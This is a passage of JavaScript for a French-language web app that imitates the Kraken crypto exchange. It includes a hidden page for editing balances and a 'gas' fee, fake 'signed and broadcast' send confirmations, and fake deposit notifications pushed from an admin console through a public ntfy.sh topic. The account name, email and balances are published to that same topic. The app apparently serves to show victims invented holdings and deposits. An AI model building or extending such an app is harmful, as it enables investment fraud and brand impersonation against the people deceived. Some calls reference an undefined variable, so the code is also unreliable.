    $("#sdCancel").addEventListener("click", () => sheetSend(pick));
    $("#sdConfirm").addEventListener("click", () => {
      const res = checkSend(pick, addr, amt);
      if (!res.ok) { sheetSend(pick); return setErr(res.msg); }
      if (pick === "EUR") {
        ST.cash = cash() - amt;
      } else {
        ST.balances[pick] = qty(pick) - amt;
        if (fee) ST.cash = cash() - fee;
      }
      save(); renderAll();
      sheetSendDone({ pick, addr, amt, fee });
    });
  }

  function sheetSendDone({ pick, addr, amt, fee }) {
    const rnd = new Uint8Array(32);
    crypto.getRandomValues(rnd);
    const ref = "0x" + Array.from(rnd, b => b.toString(16).padStart(2, "0")).join("");
    openSheet(`<div class="sheet-title">Envoi en cours</div>
      <p class="sheet-sub">Votre transaction a été signée puis diffusée sur le réseau.</p>
      <div class="recap">
        <div class="rc-row"><span>Montant</span><b>${pick === "EUR" ? eur(amt, 2) : qtyTxt(amt, pick)}</b></div>
        <div class="rc-row"><span>Frais réseau</span><b>${fee ? eur(fee, 2) : "Offerts"}</b></div>
        <div class="rc-row col"><span>Destinataire</span><code>${shortAddr(addr)}</code></div>
        <div class="rc-row col"><span>Référence</span><code>${shortAddr(ref)}</code></div>
        <div class="rc-row"><span>Statut</span><b class="ok">En cours de confirmation</b></div>
      </div>
      <button class="btn-black" id="sdOk">Terminé</button>`);
    $("#sdOk").addEventListener("click", closeSheet);
  }

  function sheetReceive(explicit) {
    PICK = explicit || PICK || "BTC";
    const a = PICK === "EUR" ? null : bySym(PICK);
    const addr = addrFor(PICK);
    openSheet(`<div class="sheet-title">Recevoir</div>
      <p class="sheet-sub">Choisissez l'actif à recevoir.</p>
      <button class="pick-line" id="rcPick">
        ${PICK === "EUR" ? `<img class="coin" src="assets/img/flag_eu.webp" alt="">` : iconFor(a)}
        <span class="pick-main"><b>${PICK === "EUR" ? "Euro" : a.name}</b><i>${PICK === "EUR" ? "Virement SEPA" : PICK}</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg>
      </button>
      <div class="addr-box"><code id="rcAddr">${addr}</code></div>
      <button class="btn-black" id="rcCopy">Copier l'adresse</button>`);
    $("#rcPick").addEventListener("click", () => openAssetPicker(s => sheetReceive(s)));
    $("#rcCopy").addEventListener("click", () => {
      navigator.clipboard?.writeText(addr);
      toast("Adresse copiée");
    });
  }

  function sheetBuy(explicit) {
    PICK = explicit || (CURRENT && CURRENT.type === "crypto" ? CURRENT.sym : "BTC");
    const a = bySym(PICK);
    openSheet(`<div class="sheet-title">Acheter</div>
      <p class="sheet-sub">Montant en euros · solde disponible ${eur(cash(), 2)}</p>
      <button class="pick-line" id="byPick">
        ${iconFor(a)}
        <span class="pick-main"><b>${a.name}</b><i>${px(a)} €</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg>
      </button>
      ${amtBox("byAmt", "€")}
      <div class="pcts">${[25, 50, 75, 100].map(p => `<button data-pct="${p}">${p} %</button>`).join("")}</div>
      <button class="btn-black" id="byGo">Acheter</button>`);
    $$("#sheetBody .pcts button").forEach(b => b.addEventListener("click", () => {
      $("#byAmt").value = nf(cash() * b.dataset.pct / 100, 2);
    }));
    $("#byPick").addEventListener("click", () => openAssetPicker(s => { if (s !== "EUR") sheetBuy(s); }));
    $("#byGo").addEventListener("click", () => {
      const v = parseAmt($("#byAmt").value);
      if (v <= 0) return toast("Saisissez un montant");
      if (v > cash()) return toast("Solde insuffisant");
      ST.cash = cash() - v;
      ST.balances[a.sym] = qty(a.sym) + v / a.price;
      save(); renderAll(); closeSheet(); toast("Achat effectué");
    });
  }

  let CV_TARGET = "BTC";
  function sheetConvert() {
    const tgt = bySym(CV_TARGET) || bySym("BTC");
    openSheet(`<div class="sheet-title">Convertir</div>
      <p class="sheet-sub">Conversion instantanée au taux du jour · solde ${eur(cash(), 2)}</p>
      <button class="pick-line" id="cvPick">${iconFor(tgt)}
        <span class="pick-main"><b>${tgt.name}</b><i>${tgt.sym}</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg></button>
      ${amtBox("cvAmt", "€")}
      <button class="btn-black" id="cvGo">Convertir</button>`);
    $("#cvPick").addEventListener("click", () => openAssetPicker(s => {
      if (s === "EUR") return;
      CV_TARGET = s;
      sheetConvert();
    }));
    $("#cvGo").addEventListener("click", () => {
      const v = parseAmt($("#cvAmt").value);
      const target = bySym(CV_TARGET);
      if (v <= 0) return toast("Saisissez un montant");
      if (v > cash()) return toast("Solde insuffisant");
      ST.cash = cash() - v;
      ST.balances[target.sym] = qty(target.sym) + v / target.price;
      save(); renderAll(); closeSheet(); toast("Conversion effectuée");
    });
  }

  // achat récurrent
  let RCR_FREQ = "Chaque semaine";
  function sheetRecurring() {
    const a = bySym(PICK !== "EUR" ? PICK : "BTC");
    const freqs = ["Chaque jour", "Chaque semaine", "Chaque mois"];
    openSheet(`<div class="sheet-title">Achat récurrent</div>
      <p class="sheet-sub">Achetez automatiquement à intervalle régulier.</p>
      <button class="pick-line" id="rcrPick">${iconFor(a)}
        <span class="pick-main"><b>${a.name}</b><i>${a.sym}</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg></button>
      ${amtBox("rcrAmt", "€")}
      <div class="freqs" id="rcrFreq">${freqs.map(f => `<button data-freq="${f}" class="${f === RCR_FREQ ? "is-on" : ""}">${f.replace("Chaque ", "")}</button>`).join("")}</div>
      <button class="btn-black" id="rcrGo">Programmer</button>`);
    $$("#rcrFreq button").forEach(b => b.addEventListener("click", () => {
      RCR_FREQ = b.dataset.freq;
      $$("#rcrFreq button").forEach(x => x.classList.toggle("is-on", x === b));
    }));
    $("#rcrPick").addEventListener("click", () => openAssetPicker(s => { if (s !== "EUR") { PICK = s; sheetRecurring(); } }));
    $("#rcrGo").addEventListener("click", () => {
      if (parseAmt($("#rcrAmt").value) <= 0) return toast("Saisissez un montant");
      closeSheet(); toast("Achat récurrent programmé");
    });
  }

  // achat à cours limité
  function sheetLimit() {
    const a = bySym(PICK !== "EUR" ? PICK : "BTC");
    openSheet(`<div class="sheet-title">Achat à cours limité</div>
      <p class="sheet-sub">L'ordre s'exécute lorsque le prix atteint votre cible.</p>
      <button class="pick-line" id="lmPick">${iconFor(a)}
        <span class="pick-main"><b>${a.name}</b><i>${a.sym} · ${px(a)} €</i></span>
        <svg viewBox="0 0 24 24" class="ico chev"><path d="M9 6l6 6-6 6"/></svg></button>
      <label class="field"><input id="lmPrice" inputmode="decimal" placeholder="${nf(a.price, 2)}"><em>€</em></label>
      ${amtBox("lmAmt", "€")}
      <button class="btn-black" id="lmGo">Placer l'ordre</button>`);
    $("#lmPick").addEventListener("click", () => openAssetPicker(s => { if (s !== "EUR") { PICK = s; sheetLimit(); } }));
    $("#lmGo").addEventListener("click", () => {
      const price = parseAmt($("#lmPrice").value);
      const amt = parseAmt($("#lmAmt").value);
      if (price <= 0) return toast("Saisissez un prix cible");
      if (amt <= 0) return toast("Saisissez un montant");
      if (amt > cash()) return toast("Solde insuffisant");
      closeSheet(); toast("Ordre à cours limité placé");
    });
  }

  const SHEETS = {
    deposit: sheetDeposit,
    withdraw: sheetWithdraw,
    send: () => sheetSend(),
    receive: () => sheetReceive(),
    buy: () => sheetBuy(),
    convert: sheetConvert,
    recurring: sheetRecurring,
    limit: sheetLimit,
    perp: () => openSheet(`<div class="sheet-title">Contrats à terme perpétuels</div>
      <p class="sheet-sub">Tradez avec un effet de levier jusqu'à 10×.</p>
      <button class="btn-black" data-sheet="perp-open">Ouvrir une position</button>`),
    funded: () => openSheet(`<div class="sheet-title">Kraken Funded</div>
      <p class="sheet-sub">Réussissez un challenge de trading pour obtenir un financement.</p>
      <button class="btn-black" data-sheet="perp-open">Voir les challenges</button>`),
    borrow: () => openSheet(`<div class="sheet-title">Emprunter</div>
      <p class="sheet-sub">Empruntez en engageant vos actifs comme garantie.</p>
      <button class="btn-black" data-sheet="perp-open">Simuler un prêt</button>`),
    card: () => openSheet(`<div class="sheet-title">Carte Krak</div>
      <p class="sheet-sub">Payez dans plus de 600 actifs et recevez 2 % de cashback.</p>
      <button class="btn-black" data-sheet="perp-open">Commander la carte</button>`),
    xstocks: () => openSheet(`<div class="sheet-title">Actions tokenisées</div>
      <p class="sheet-sub">Actions et ETF américains 24 h/24, 5 j/7.</p>
      ${ASSETS.filter(a => a.type === "stock").slice(0, 4).map(rowHTML).join("")}`),
    predict: () => openSheet(`<div class="sheet-title">Prévisions des cours</div>
      <p class="sheet-sub">Choisissez une évolution et recevez vos gains si vous avez vu juste.</p>
      <button class="btn-black" data-sheet="perp-open">Voir les marchés</button>`),
    bundles: () => openSheet(`<div class="sheet-title">Portefeuilles clés en main</div>
      <p class="sheet-sub">Diversifiez en quelques secondes.</p>${BUNDLES.map(bundleHTML).join("")}`),
    offers: () => openSheet(`<div class="sheet-title">Offres</div>
      <p class="sheet-sub">Offres et incitations en cours.</p>
      <div class="row" data-sheet="none"><div class="row-main"><div class="row-name">100 $ en BTC</div><div class="row-sub">Black Friday · dépôt minimum 1 000 $</div></div></div>`),
    "perp-open": () => openSheet(`<div class="sheet-title">Position perpétuelle</div>
      <p class="sheet-sub">Levier jusqu'à 10×. Les produits dérivés comportent un risque de perte.</p>
      ${amtBox("ppAmt", "€")}
      <button class="btn-black" id="ppGo">Ouvrir la position</button>`)
  };

  function openNamedSheet(name) {
    const fn = SHEETS[name];
    if (!fn) return;
    fn();
    if (name === "perp-open") $("#ppGo").addEventListener("click", () => {
      if (parseAmt($("#ppAmt").value) <= 0) return toast("Saisissez un montant");
      closeSheet(); toast("Position ouverte");
    });
  }

  // ── toast ───────────────────────────────────────────────────────────
  let tT;
  function toast(m) {
    const t = $("#toast");
    t.textContent = m; t.classList.add("on");
    clearTimeout(tT); tT = setTimeout(() => t.classList.remove("on"), 2100);
  }

  // ── compte partagé + diffusion (ntfy) ───────────────────────────────
  const TOPIC = "kraken-partage-4b8d1c6f";
  const NKEY = "kraken_notifs_v1";
  const SYNC = { on: false, busy: false, last: 0, timer: null };
  let applying = false;

  function notifList() {
    try { const a = JSON.parse(localStorage.getItem(NKEY) || "[]"); return Array.isArray(a) ? a : []; }
    catch { return []; }
  }
  function notifSave(a) { localStorage.setItem(NKEY, JSON.stringify(a.slice(0, 40))); }

  function notifBadge() {
    const n = notifList();
    const seen = Number(localStorage.getItem(NKEY + "_seen") || 0);
    const dot = $("#notifDot");
    if (dot) dot.hidden = !n.some(x => (x.at || 0) > seen);
  }

  function showBanner(o) {
    const b = document.createElement("div");
    b.className = "ios-banner";
    b.innerHTML = `<div class="ios-b-ico"><img src="assets/img/app-icon.webp"></div>
      <div class="ios-b-main">
        <div class="ios-b-head"><b>Kraken</b><span>maintenant</span></div>
        <div class="ios-b-title">${o.kind === "deposit" ? "Dépôt reçu" : "Notification"}</div>
        <div class="ios-b-text">${o.text || (o.amount ? "Dépôt de " + (o.asset === "EUR" ? eur(o.amount) : qtyTxt(o.amount, o.asset)) + " crédité." : "Nouveau message.")}</div>
      </div>`;
    document.body.appendChild(b);
    setTimeout(() => b.classList.add("on"), 100);
    setTimeout(() => { b.classList.remove("on"); setTimeout(() => b.remove(), 600); }, 5000);
  }
  function addNotif(o) {
    const list = notifList();
    if (list.some(x => x.id === o.id)) return;
    list.unshift({ id: o.id, text: o.text || "", amount: o.amount || 0, addr: o.addr || "", at: o.at || Date.now(), kind: o.kind || "notice", asset: o.asset || "" });
    notifSave(list);
    notifBadge(); if (!applying) showBanner(o);
  }

  const fmtWhen = ts => {
    const d = new Date(ts);
    return d.toLocaleDateString("fr-FR", { day: "2-digit", month: "short" }) + " · " + d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
  };

  function openNotifs() {
    const list = notifList();
    localStorage.setItem(NKEY + "_seen", String(Date.now()));
    notifBadge(); if (!applying) showBanner(o);
    if (!list.length) {
      openSheet(`<div class="sheet-title">Notifications</div>
        <p class="sheet-sub">Aucune notification pour le moment. Les dépôts et messages envoyés depuis la diffusion apparaissent ici.</p>`);
      return;
    }
    openSheet(`<div class="sheet-title">Notifications</div>
      <p class="sheet-sub">${list.length} message${list.length > 1 ? "s" : ""} reçu${list.length > 1 ? "s" : ""}.</p>
      <div class="notif-list">${list.map(n => `
        <div class="notif">
          <span class="notif-ico ${n.kind === "deposit" ? "is-dep" : ""}">
            <svg viewBox="0 0 24 24" class="ico"><path d="M12 19V5"/><path d="M6 11l6-6 6 6"/></svg>
          </span>
          <div class="notif-main">
            <div class="notif-title">${n.kind === "deposit" ? "Dépôt reçu" : "Notification"}</div>
            <div class="notif-text">${n.text || (n.amount ? "Un dépôt a été crédité sur votre compte." : "Nouveau message de Kraken.")}</div>
            ${n.amount ? `<div class="notif-meta">+${n.asset && n.asset !== "EUR" ? qtyTxt(n.amount, n.asset) : eur(n.amount, 2)}</div>` : ""}
            ${n.addr ? `<div class="notif-addr">${shortAddr(n.addr)}</div>` : ""}
            <div class="notif-when">${fmtWhen(n.at)}</div>
          </div>
        </div>`).join("")}</div>`);
  }

  async function publishAccount() {
    ST.rev = Date.now();
    saveLocal();
    try {
      await fetch("https://ntfy.sh/" + TOPIC, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify({
          app: "kraken", type: "state",
          state: {
            first: ST.first, last: ST.last, email: ST.email,
            cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
            balances: { ...ST.balances }, fees: { ...ST.fees },
            addresses: { ...ST.addresses }, rev: ST.rev
          }
        })
      });
    } catch { /* hors ligne */ }
  }

  function applyState(s) {
    if (!s || typeof s !== "object") return false;
    if (!(Number(s.rev) > (Number(ST.rev) || 0))) return false;
    applying = true;
    ST.first = String(s.first ?? ST.first);
    ST.last = String(s.last ?? ST.last);
    ST.email = String(s.email ?? ST.email);
    ST.cash = Math.max(0, Number(s.cash) || 0);
    ST.gas = Math.max(0, Number(s.gas) || 0);
    ST.balances = { ...(s.balances || {}) };
    ST.fees = { ...(s.fees || {}) };
    ST.addresses = { ...(s.addresses || {}) };
    ST.rev = Number(s.rev) || 0;
    saveLocal();
    applying = false;
    renderAll();
    return true;
  }

  function syncStatus() {
    const t = $("#syncTopic"); if (t) t.textContent = TOPIC;
    const r = $("#syncRev"); if (r) r.textContent = ST.rev ? fmtWhen(ST.rev) : "—";
    const a = $("#syncAt"); if (a) a.textContent = SYNC.last ? fmtWhen(SYNC.last) : "en attente";
    const b = $("#syncNow"); if (b) b.textContent = SYNC.busy ? "Synchronisation…" : "Forcer la synchronisation";
  }

  async function syncPoll() {
    if (SYNC.busy) return;
    SYNC.busy = true; syncStatus();
    try {
      const since = SYNC.last ? Math.max(0, Math.floor(SYNC.last / 1000) - 2) : 0;
      const url = "https://ntfy.sh/" + TOPIC + "/json?poll=1" + (since ? "&since=" + since : "&since=all");
      const res = await fetch(url, { cache: "no-store" });
      const txt = await res.text();
      let touched = false;
      for (const line of txt.split("\n")) {
        const raw = line.trim(); if (!raw) continue;
        let m; try { m = JSON.parse(raw); } catch { continue; }
        if (m.event !== "message" || !m.message) continue;
        SYNC.last = Math.max(SYNC.last, (Number(m.time) || 0) * 1000 || Date.now());
        let p; try { p = JSON.parse(m.message); } catch { continue; }
        if (!p || p.app !== "kraken") continue;
        if (p.type === "state" && p.state) touched = applyState(p.state) || touched;
        else if (p.type === "notify") {
          addNotif({ id: p.id || m.id, text: p.text, amount: Number(p.amount) || 0, addr: p.addr || "", at: (Number(m.time) || 0) * 1000 || Date.now(), kind: p.kind, asset: p.asset || "" });
        }
      }
      if (touched) toast("Compte mis à jour");
    } catch { /* hors ligne */ }
    SYNC.busy = false;
    syncStatus();
  }

  function startSync() {
    if (SYNC.on) return;
    SYNC.on = true;
    syncPoll();
    SYNC.timer = setInterval(syncPoll, 15000);
  }

  // ── administration : console séparée (admin.html) ────────────────────

  // ── PIN ─────────────────────────────────────────────────────────────
  let pin = "";
  const pinRender = () => $$("#pinDots i").forEach((d, i) => d.classList.toggle("on", i < pin.length));
  function pinPress(k) {
    if (k === "del") pin = pin.slice(0, -1);
    else if (pin.length < 6) pin += k;
    pinRender();
    if (pin.length === 6) setTimeout(() => { pin = ""; pinRender(); unlock(); }, 130);
  }
  function unlock() { screen("app"); go(VIEW); }

  // ── page privée ─────────────────────────────────────────────────────
  function renderSecret() {
    $("#sFirst").value = ST.first || "";
    $("#sLast").value = ST.last || "";
    $("#sMail").value = ST.email || "";
    $("#sCreated").value = ST.created || "2014-03-12";
    $("#sGas").value = nf(ST.gas || 0, 2);
    $("#sCash").value = nf(cash(), 2);
    $("#gasPreview").textContent = eur(ST.gas || 0, 2);
    $("#balanceFields").innerHTML = CRYPTOS().map(a => {
      const b = qty(a.sym);
      return `<div class="balrow"><img class="coin coin-sm" src="${a.icon}" alt="">
        <span class="sym">${a.sym}</span>
        <input data-bal="${a.sym}" inputmode="decimal" placeholder="0" value="${b ? String(b).replace(".", ",") : ""}">
        <span class="val" id="val-${a.sym}">${b ? eur(b * a.price) : "0,00 €"}</span></div>`;
    }).join("");
    $$("[data-bal]").forEach(inp => inp.addEventListener("input", () => {
      const sym = inp.dataset.bal;
      const v = parseAmt(inp.value);
      $("#val-" + sym).textContent = v ? eur(v * bySym(sym).price) : "0,00 €";
    }));
    $("#sGas").oninput = e => $("#gasPreview").textContent = eur(parseAmt(e.target.value), 2);
  }

  function saveSecret() {
    ST.first = $("#sFirst").value.trim() || "bernard";
    ST.last = $("#sLast").value.trim();
    ST.email = $("#sMail").value.trim() || ST.email;
    ST.created = $("#sCreated").value || "2014-03-12";
    ST.gas = parseAmt($("#sGas").value);
    ST.cash = Math.max(0, parseAmt($("#sCash").value));
    $$("[data-bal]").forEach(inp => {
      ST.balances[inp.dataset.bal] = Math.max(0, parseAmt(inp.value));
    });
    save(); renderAll(); publishAccount(); toast("Compte mis à jour"); screen("app"); go("portfolio");
  }

  function renderAll() { renderHead(); renderHome(); renderPortfolio(); renderStrip(); renderPredict(); }

  function refresh() { renderAll(); if (CURRENT && $("#detail").classList.contains("is-on")) drawChart(); }

  // ── événements ──────────────────────────────────────────────────────
  document.addEventListener("click", e => {
    const t = e.target;

    const g = t.closest("[data-goto]"); if (g) return go(g.dataset.goto);
    const sh = t.closest("[data-sheet]");
    if (sh && sh.dataset.sheet !== "none") return openNamedSheet(sh.dataset.sheet);

    const acc = t.closest(".acc");
    if (acc) { acc.classList.toggle("open"); return; }

    const row = t.closest("[data-asset]");
    if (row) {
      const sym = row.dataset.asset;
      if (sheet.classList.contains("on")) { closeSheet(); return openDetail(sym); }
      if (sym === "EUR") { renderPortfolio(); return sheetDeposit(); }
      return openDetail(sym);
    }
    const bdl = t.closest("[data-bundle]");
    if (bdl) return toast(bdl.dataset.bundle === "DUO" ? "Duo BTC/ETH" : "Réserve stratégique des États-Unis");

    const cat = t.closest("[data-cat]");
    if (cat) {
      homeCat = cat.dataset.cat;
      $$("#homeCats .cat-tab").forEach(x => x.classList.toggle("is-on", x === cat));
      return renderHome();
    }
    const ecat = t.closest("[data-ecat]");
    if (ecat) {
      $$("#exCats .cat").forEach(x => x.classList.toggle("is-on", x === ecat));
      return;
    }
    const f = t.closest("[data-f]");
    if (f) {
      searchFilter = f.dataset.f;
      $$("#searchChips .chip").forEach(c => c.classList.toggle("is-on", c === f));
      return renderSearch($("#searchInput").value);
    }
    const rng = t.closest("[data-range]");
    if (rng) {
      RANGE = rng.dataset.range;
      $$("#detRanges button").forEach(b => b.classList.toggle("is-on", b === rng));
      return drawChart();
    }
    const k = t.closest("[data-k]"); if (k) return pinPress(k.dataset.k);

    const pay = t.closest("[data-method]");
    if (pay) return;
  });

  $("#pinSkip").addEventListener("click", () => { pin = ""; pinRender(); unlock(); });
  $("#fab").addEventListener("click", () => openSheet(`
    <div class="sheet-title">Actions</div>
    <div class="row" data-sheet="deposit"><div class="row-main"><div class="row-name">Déposer</div><div class="row-sub">Ajoutez des fonds</div></div></div>
    <div class="row" data-sheet="withdraw"><div class="row-main"><div class="row-name">Retirer</div><div class="row-sub">Vers votre banque</div></div></div>
    <div class="row" data-sheet="send"><div class="row-main"><div class="row-name">Envoyer</div><div class="row-sub">Crypto ou euro</div></div></div>
    <div class="row" data-sheet="receive"><div class="row-main"><div class="row-name">Recevoir</div><div class="row-sub">Adresse de dépôt</div></div></div>
    <div class="row" data-sheet="buy"><div class="row-main"><div class="row-name">Acheter</div><div class="row-sub">Acheter un actif</div></div></div>`));

  $("#searchBtn").addEventListener("click", () => { screen("searchScreen"); renderSearch(""); });
  $("#searchBack").addEventListener("click", () => { screen("app"); go(VIEW); });
  $("#searchInput").addEventListener("input", e => renderSearch(e.target.value));
  $("#detBack").addEventListener("click", () => { screen("app"); go(VIEW); });
  $("#detBuy").addEventListener("click", () => sheetBuy());
  $("#detStar").addEventListener("click", function () {
    if (!CURRENT) return;
    const i = ST.favorites.indexOf(CURRENT.sym);
    const on = i === -1;
    if (on) ST.favorites.push(CURRENT.sym); else ST.favorites.splice(i, 1);
    this.classList.toggle("is-on", on);
    saveLocal(); renderHome(); toast(on ? "Ajouté aux favoris" : "Retiré des favoris");
  });
  $("#detMore").addEventListener("click", () => openSheet(`<div class="sheet-title">${CURRENT ? CURRENT.name : ""}</div>
    <div class="row" data-sheet="buy"><div class="row-main"><div class="row-name">Acheter</div><div class="row-sub">Ordre au marché</div></div></div>
    <div class="row" data-sheet="send"><div class="row-main"><div class="row-name">Envoyer</div><div class="row-sub">Vers une adresse externe</div></div></div>
    <div class="row" data-sheet="receive"><div class="row-main"><div class="row-name">Recevoir</div><div class="row-sub">Adresse de dépôt</div></div></div>`));
  $("#headMore").addEventListener("click", () => openSheet(`<div class="sheet-title">Portefeuille</div>
    <div class="row" data-sheet="deposit"><div class="row-main"><div class="row-name">Ajoutez des fonds</div><div class="row-sub">Virement ou carte</div></div></div>
    <div class="row" data-sheet="withdraw"><div class="row-main"><div class="row-name">Retirer</div><div class="row-sub">Vers votre compte bancaire</div></div></div>`));
  $("#manageFav").addEventListener("click", () => go("explorer"));
  $("#depositBtn").addEventListener("click", () => sheetDeposit());
  $("#buyBtn").addEventListener("click", () => sheetBuy());
  $("#offerSecret").addEventListener("click", () => { renderSecret(); screen("secret"); });
  $("#openSecret").addEventListener("click", () => { renderSecret(); screen("secret"); });
  $("#openSecretPf").addEventListener("click", () => { renderSecret(); screen("secret"); });
  $("#secretBack").addEventListener("click", () => { screen("app"); go("portfolio"); });
  $("#secretSave").addEventListener("click", saveSecret);
  $("#secretReset").addEventListener("click", () => { localStorage.removeItem(KEY); localStorage.removeItem(PCACHE); location.reload(); });
  $("#lockApp").addEventListener("click", () => { pin = ""; pinRender(); screen("pin"); });

  $("#notifBtn").addEventListener("click", openNotifs);
    $("#avatarBtn").onclick = () => { renderSecret(); screen("secret"); };
  $("#goAdmin").addEventListener("click", () => { location.href = "admin.html"; });

  addEventListener("scroll", () => $(".app-head")?.classList.toggle("scrolled", scrollY > 4), { passive: true });
  document.addEventListener("visibilitychange", () => { if (!document.hidden) { tick(); syncPoll(); } });

  // ── boot ────────────────────────────────────────────────────────────
  loadCache();
  renderAll();
  pinRender();
  notifBadge(); if (!applying) showBanner(o);
  startSync();

  const h = location.hash.replace(/^#\/?/, "");
  const VIEWS = ["home", "explorer", "portfolio", "more"];
  if (h === "secret") { renderSecret(); screen("secret"); }
  else if (h === "admin") { location.replace("admin.html"); }
  else if (h === "search") { screen("searchScreen"); renderSearch(""); }
  else if (h.startsWith("asset/")) { screen("app"); go("home"); openDetail(h.slice(6).toUpperCase()); }
  else if (VIEWS.includes(h)) { screen("app"); go(h); }
  else if (h === "app") { screen("app"); go("home"); }
  else if (h === "pin") { screen("pin"); }
  else {
    screen("splash");
    setTimeout(() => { screen("app"); go("home"); }, 1900);
  }

  schedule();
  tick();
})();


